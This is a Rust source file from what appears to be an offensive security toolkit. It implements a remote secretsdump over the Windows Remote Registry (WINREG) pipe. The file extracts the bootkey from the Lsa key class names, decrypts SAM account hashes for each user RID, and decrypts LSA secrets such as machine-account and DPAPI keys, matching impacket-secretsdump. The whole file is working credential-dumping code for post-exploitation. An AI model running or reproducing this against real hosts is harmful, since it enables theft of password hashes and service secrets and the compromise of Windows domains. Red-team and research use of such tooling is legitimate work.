//! Fast-path secretsdump via MS-RRP (Remote Registry) instead of `reg save` + SMB `C$` read.
//!
//! The old path saves whole SYSTEM/SAM/SECURITY hives (SYSTEM alone is ~15 MB) via a SCM
//! service, downloads them, then parses. Big and slow — and on a hardened DC where
//! `reg save HKLM\SAM` needs `SeBackupPrivilege` the SAM save fails and we waste seconds
//! polling for a file that never appears.
//!
//! This path uses the WINREG API (`\PIPE\winreg`) to read only what we need:
//! - `Lsa\{JD,Skew1,GBG,Data}` **key class names** for the bootkey (4 tiny RPC roundtrips).
//! - `SAM\SAM\Domains\Account\{F, Users\<RID>\V}` — SAM users, one query per RID.
//! - `SECURITY\Policy\PolEKList` + enum `Policy\Secrets\<name>\CurrVal` — LSA secrets.
//!
//! Matches impacket-secretsdump's approach and speed.

use crate::{lsa, sam};
use dcerpc::rrp::RegistryClient;
use dcerpc::{Result, RpcError};

/// Extract the 16-byte bootkey ("syskey") from `HKLM\SYSTEM\…\Lsa\{JD,Skew1,GBG,Data}`
/// key class names via WINREG — no hive file needed.
///
/// The class names are 8 hex chars each; concatenated (32 chars) they scramble the bootkey
/// under the fixed permutation `P` (same as the hive-based path in `crate::sam::bootkey`).
pub async fn bootkey_via_rrp(reg: &mut RegistryClient<'_>) -> Result<[u8; 16]> {
    let hklm = reg.hklm().await?;
    // Which control set is active — read `HKLM\SYSTEM\Select\Current`.
    let sel = reg.open(&hklm, r"SYSTEM\Select").await?;
    let cs = reg.query(&sel, "Current").await?.as_dword().unwrap_or(1);
    reg.close_handle(&sel).await;

    let lsa_path = format!(r"SYSTEM\ControlSet{cs:03}\Control\Lsa");
    let lsa = reg.open(&hklm, &lsa_path).await?;

    let mut hex = String::with_capacity(32);
    for k in ["JD", "Skew1", "GBG", "Data"] {
        let sub = reg.open(&lsa, k).await?;
        let class = reg.query_info_class(&sub).await?;
        reg.close_handle(&sub).await;
        // Impacket strips any embedded NULs; class comes back as ASCII already.
        hex.push_str(class.trim_end_matches('\0'));
    }
    reg.close_handle(&lsa).await;
    reg.close_handle(&hklm).await;

    if hex.len() < 32 {
        return Err(RpcError::Protocol(format!(
            "bootkey: assembled hex too short ({} chars)",
            hex.len()
        )));
    }
    let scrambled = hex::decode(&hex[..32])
        .map_err(|_| RpcError::Protocol(format!("bootkey: hex decode failed: {hex}")))?;
    const P: [usize; 16] = [
        0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7,
    ];
    let mut bk = [0u8; 16];
    for i in 0..16 {
        bk[i] = scrambled[P[i]];
    }
    Ok(bk)
}

/// Full SAM secretsdump via WINREG — no hive files, no `reg save`. Matches
/// impacket-secretsdump's `-sam SYSTEM` mode step by step:
///
/// 1. Open `HKLM\SAM\SAM\Domains\Account`, read the `F` value → derive hashed bootkey.
/// 2. Open `Users`, enumerate its subkeys (each is a hex RID), skip the `Names` alias.
/// 3. For each RID, read the `V` value → decrypt with per-user key from `F`+bootkey+rid.
pub async fn dump_sam_via_rrp(
    reg: &mut RegistryClient<'_>,
    bootkey: &[u8; 16],
) -> Result<Vec<sam::SamAccount>> {
    // SAM subtree needs REG_OPTION_BACKUP_RESTORE (dwOptions=4) — otherwise DA can't read.
    let hklm = reg.hklm().await?;
    let account = reg.open_backup(&hklm, r"SAM\SAM\Domains\Account").await?;
    let f = reg.query(&account, "F").await?.data;
    let hbk = sam::hashed_bootkey_from_f(&f, bootkey)
        .ok_or_else(|| RpcError::Protocol("F value shape unexpected".into()))?;

    let users = reg.open_backup(&account, "Users").await?;
    let mut out = Vec::new();
    let mut idx = 0u32;
    while let Some(name) = reg.enum_key(&users, idx).await? {
        idx += 1;
        // Users has one non-RID subkey called "Names" — skip it.
        let Ok(rid) = u32::from_str_radix(&name, 16) else {
            continue;
        };
        let user_key = match reg.open_backup(&users, &name).await {
            Ok(k) => k,
            Err(_) => continue,
        };
        let v = reg.query(&user_key, "V").await;
        reg.close_handle(&user_key).await;
        let Ok(v) = v else { continue };
        if let Some(acct) = sam::decrypt_user(&v.data, rid, &hbk) {
            out.push(acct);
        }
    }
    reg.close_handle(&users).await;
    reg.close_handle(&account).await;
    reg.close_handle(&hklm).await;
    out.sort_by_key(|a| a.rid);
    Ok(out)
}

/// Full LSA secrets dump via WINREG — no hive files. Matches impacket's LSA path:
///
/// 1. Open `HKLM\SECURITY\Policy\PolEKList`, read default value → unwrap → LSA key.
/// 2. Open `Policy\Secrets`, enumerate subkeys (each is a secret name — `NL$KM`,
///    `$MACHINE.ACC`, `DPAPI_SYSTEM`, third-party service accounts …).
/// 3. For each, open `<name>\CurrVal`, read default value → decrypt with the LSA key.
///
/// DCC2 cached-credential dumping (values under `HKLM\SECURITY\Cache`) is a follow-up —
/// it needs `BaseRegEnumValue` (opnum 10) which is not wired yet.
pub async fn dump_lsa_via_rrp(
    reg: &mut RegistryClient<'_>,
    bootkey: &[u8; 16],
) -> Result<Vec<lsa::LsaSecret>> {
    // SECURITY subtree also needs REG_OPTION_BACKUP_RESTORE.
    let hklm = reg.hklm().await?;
    let polekl = reg
        .open_backup(&hklm, r"SECURITY\Policy\PolEKList")
        .await
        .map_err(|e| RpcError::Protocol(format!("open PolEKList: {e}")))?;
    let pol = reg.query(&polekl, "").await?.data;
    reg.close_handle(&polekl).await;
    let lsa_key = lsa::lsa_key_from_polekl(&pol, bootkey)
        .ok_or_else(|| RpcError::Protocol("PolEKList shape unexpected".into()))?;

    let secrets = reg.open_backup(&hklm, r"SECURITY\Policy\Secrets").await?;
    let mut out = Vec::new();
    let mut idx = 0u32;
    while let Some(name) = reg.enum_key(&secrets, idx).await? {
        idx += 1;
        if name.eq_ignore_ascii_case("NL$Control") {
            continue;
        }
        let curr = match reg.open_backup(&secrets, &format!("{name}\\CurrVal")).await {
            Ok(k) => k,
            Err(_) => continue,
        };
        let enc = reg.query(&curr, "").await;
        reg.close_handle(&curr).await;
        let Ok(enc) = enc else { continue };
        if let Some(plain) = lsa::decrypt_secret_public(&lsa_key, &enc.data) {
            out.push(lsa::LsaSecret { name, secret: plain });
        }
    }
    reg.close_handle(&secrets).await;
    reg.close_handle(&hklm).await;
    Ok(out)
}
